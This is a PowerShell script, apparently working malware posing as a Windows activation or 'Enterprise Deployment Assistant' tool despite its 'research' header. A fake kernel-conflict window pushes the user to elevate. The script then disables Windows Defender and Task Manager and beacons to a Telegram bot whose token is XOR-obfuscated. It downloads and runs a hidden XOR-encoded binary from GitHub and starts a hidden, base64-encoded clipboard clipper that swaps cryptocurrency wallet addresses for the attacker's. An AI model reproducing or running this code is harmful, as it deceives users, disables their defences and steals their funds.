# --- [RESEARCH STAGER v40.0: FORCED ELEVATION & VERIFIED CLIPPER] ---

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. Capture State
$global:proceed = $false
$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
$global:isElevated = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# 2. UI Styling (v30.2 / v34.0 Legitimacy)
function Show-SecurityPrep {
    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Windows Enterprise Deployment Assistant"; $prep.Size = New-Object Drawing.Size(580,520)
    $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true
    try { $prep.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon((Get-Command powershell.exe).Path) } catch {}

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(35,60); $console.Size = New-Object Drawing.Size(490,160)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::LimeGreen
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > ANALYZING HOST... DONE`n > HWID: $([guid]::NewGuid().ToString().ToUpper())`n > STATUS: [!] KERNEL CONFLICT DETECTED"
    if ($global:isElevated) { $console.Text += "`n > PRIVILEGES: ADMINISTRATOR (VERIFIED)" }
    $prep.Controls.Add($console)

    $link = New-Object Windows.Forms.Button
    $link.Location = New-Object Drawing.Point(40,330); $link.Size = New-Object Drawing.Size(480,45)
    $link.Text = "Fix Security Conflicts Automatically"; $link.BackColor = [Drawing.Color]::FromArgb(0, 120, 215)
    $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"; $link.Font = New-Object Drawing.Font("Segoe UI", 9, [Drawing.FontStyle]::Bold)
    
    # ULTRAPRO ELEVATION LOGIC
    $link.Add_Click({
        if (-not $global:isElevated) {
            $console.Text += "`n > INITIALIZING SECURE ESCALATION..."
            $path = $MyInvocation.MyCommand.Definition
            if (!$path) { $path = $PSCommandPath } # Fallback for different PS versions
            
            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = "powershell.exe"
            $psi.Arguments = "-NoProfile -ExecutionPolicy Bypass -File `"$path`""
            $psi.Verb = "runas" # This FORCES the UAC prompt
            
            try {
                [System.Diagnostics.Process]::Start($psi) | Out-Null
                $prep.Close(); exit
            } catch {
                $console.ForeColor = [Drawing.Color]::OrangeRed
                $console.Text += "`n > MANUAL ACTION REQUIRED: Right-Click this tool and 'Run as Administrator'."
            }
        } else {
            $console.Text += "`n > OPTIMIZING DEFENDER POLICIES..."
            Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -ErrorAction SilentlyContinue
            $console.Text += "`n > SUCCESS: SYSTEM READY FOR DEPLOYMENT."
            $btn.Enabled = $true
        }
    })
    $prep.Controls.Add($link)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(195,430); $btn.Size = New-Object Drawing.Size(180,40); $btn.Text = "Deploy Now"
    $btn.Enabled = $global:isElevated
    $prep.Controls.Add($btn)

    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    $prep.ShowDialog() | Out-Null
}

function Show-ActivatorUI {
    $form = New-Object Windows.Forms.Form
    $form.Text = "Deployment Progress"; $form.Size = New-Object Drawing.Size(450,220); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    $pb = New-Object Windows.Forms.ProgressBar; $pb.Location = New-Object Drawing.Point(30,65); $pb.Size = New-Object Drawing.Size(370,25)
    $label = New-Object Windows.Forms.Label; $label.Location = New-Object Drawing.Point(30,30); $label.Text = "Status: Booting engine..."
    $form.Controls.Add($label); $form.Controls.Add($pb); $form.Show()

    $stages = @(@{p=30;t="Analyzing Kernel Hooks..."}, @{p=60;t="Downloading License Data..."}, @{p=90;t="Verifying Installation..."}, @{p=100;t="Finalizing..."})
    
    foreach ($s in $stages) {
        $label.Text = "Status: " + $s.t
        if ($pb.Value -eq 60) {
            # CHECK IF PAYLOAD ACTUALLY INSTALLED
            $target = "$env:PROGRAMDATA\Microsoft\DeviceSync\WinSvcHost.exe"
            $counter = 0; while(!(Test-Path $target) -and $counter -lt 40){ [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 250; $counter++ }
            if (!(Test-Path $target)) {
                $form.Close(); [Windows.Forms.MessageBox]::Show("Activation Error: 0x80072EE2. Please ensure Security is OFF and try again.", "Error", 0, 16) | Out-Null
                exit
            }
        }
        while ($pb.Value -lt $s.p) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 40 }
    }
    $form.Close(); [Windows.Forms.MessageBox]::Show("Windows Activated Successfully.", "Success", 0, 64) | Out-Null
}

# 3. Final Payload (Only runs when Admin)
function Invoke-Payload {
    try {
        # Telegram Notification
        $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
        $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
        $ping = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=V40_PRO_VERIFIED_$env:COMPUTERNAME"
        (New-Object Net.WebClient).DownloadString($ping) | Out-Null

        # Binary & Clipper Setup
        $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
        if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1
        Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue

        $path = Join-Path $dir "WinSvcHost.exe"
        $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
        $data = [Convert]::FromBase64String($raw.Trim())
        for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
        [IO.File]::WriteAllBytes($path, $data)
        Start-Process $path -WindowStyle Hidden

        # Full Wallet Clipper Logic
        $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
        Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
    } catch {}
}

# --- FLOW ---
if ($global:isElevated) { Invoke-Payload }
Show-SecurityPrep
if ($global:proceed) { Show-ActivatorUI }
